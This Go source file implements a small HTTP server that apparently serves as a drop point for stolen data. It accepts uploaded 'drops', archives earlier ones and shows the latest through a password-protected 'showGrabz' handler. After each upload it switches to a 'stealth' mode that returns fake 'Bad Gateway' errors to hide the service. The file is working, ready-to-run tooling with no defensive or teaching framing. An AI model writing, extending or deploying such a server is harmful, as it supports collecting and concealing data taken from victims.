package main

import (
	"bytes"
	"fmt"
	"io"
	"io/ioutil"
	"log"
	"net/http"
	"os"
	"strings"
	"time"

	"github.com/gorilla/mux"
	"github.com/urfave/negroni"
)

const INTERFACE = "127.0.0.1"
const PORT = "8000"
const SERVER = INTERFACE + ":" + PORT

const DUMP = "dump/"
const FILENAME = "drop.txt"

var PASSWD = os.Getenv("CH_PASSWD")
var STEALTH = false

func showGrabz(w http.ResponseWriter, r *http.Request) {
	// If in STEALTH mode accept connections
	// Authenticate to access drops
	if !STEALTH {
		http.Error(w, "Bad Gateway", http.StatusBadGateway)
		return
	} else {
		passwd := r.URL.Query().Get("passwd")
		if passwd != PASSWD {
			http.Error(w, "Unauthorized", http.StatusUnauthorized)
		} else {
			content, err := ioutil.ReadFile(FILENAME) // the file is inside the local directory
			if err != nil {
				fmt.Println("Err")
			}
			fmt.Fprintf(w, "%s", string(content))
		}
	}
}

func recvDrop(w http.ResponseWriter, r *http.Request) {
	if STEALTH {
		http.Error(w, "Bad Gateway", http.StatusBadGateway)
		return
	} else {
		// receive txt file and save it
		r.ParseMultipartForm(32 << 20) // limit your max input length!
		var buf bytes.Buffer
		// in your case file would be fileupload
		fp, header, err := r.FormFile("data")
		if err != nil {
			panic(err)
		}
		defer fp.Close()
		name := strings.Split(header.Filename, ".")
		fmt.Printf("[+] Received file: %s\n", header.Filename)
		// Copy the file data to my buffer
		io.Copy(&buf, fp)
		// move old txt file to dump
		// rename new txt to drop.txt
		if _, err := os.Stat(DUMP); err != nil {
			os.Mkdir(DUMP, 0770)
		}
		if _, err := os.Stat(FILENAME); err == nil {
			os.Rename(FILENAME, DUMP+(strings.Split(FILENAME, "."))[0]+"-"+time.Now().String()+"."+name[1])
		}
		fptr, err := os.Create(FILENAME)
		if err != nil {
			log.Fatal(err)
		}
		contents := buf.String()
		defer fptr.Close()
		for _, line := range contents {
			fptr.WriteString(string(line))
		}
		// reset the buffer in case I want to use it again
		// reduces memory allocations in more intense projects
		buf.Reset()
		// send false signal and enter STEALTH mode
		STEALTH = true
		http.Error(w, "Bad Gateway", http.StatusBadGateway)
	}
}

func startServer(w http.ResponseWriter, r *http.Request) {
	// Check if dump directory exists and create if not exists
	// If in STEALTH mode accept connections
	// Authenticate to start server with GET request to /start
	if !STEALTH {
		http.Error(w, "Bad Gateway", http.StatusBadGateway)
	} else {
		passwd := r.URL.Query().Get("passwd")
		if passwd != PASSWD {
			http.Error(w, "Unauthorized", http.StatusUnauthorized)
		} else {
			fmt.Fprintf(w, "Server started at %s\n", time.Now().String())
			STEALTH = false
		}
	}
}

func stopServer(w http.ResponseWriter, r *http.Request) {
	// If not in STEALTH mode accept connections
	// Authenticate to stop server with GET request to /stop
	if STEALTH {
		http.Error(w, "Bad Gateway", http.StatusBadGateway)
	} else {
		passwd := r.URL.Query().Get("passwd")
		if passwd != PASSWD {
			http.Error(w, "Unauthorized", http.StatusUnauthorized)
		} else {
			fmt.Fprintf(w, "Server stopped at %s\n", time.Now().String())
			STEALTH = true
		}
	}
}

// need execute script in python to daemonise and log to file
func main() {
	if PASSWD == "" {
		fmt.Println("Error environmental variable CH_PASSWD not set")
		os.Exit(0)
	}
	r := mux.NewRouter()
	r.HandleFunc("/", showGrabz).Methods("GET")
	r.HandleFunc("/", recvDrop).Methods("POST")
	r.HandleFunc("/start", startServer).Methods("GET")
	r.HandleFunc("/stop", stopServer).Methods("GET")
	n := negroni.Classic()
	n.UseHandler(r)
	http.ListenAndServe(SERVER, n)
}
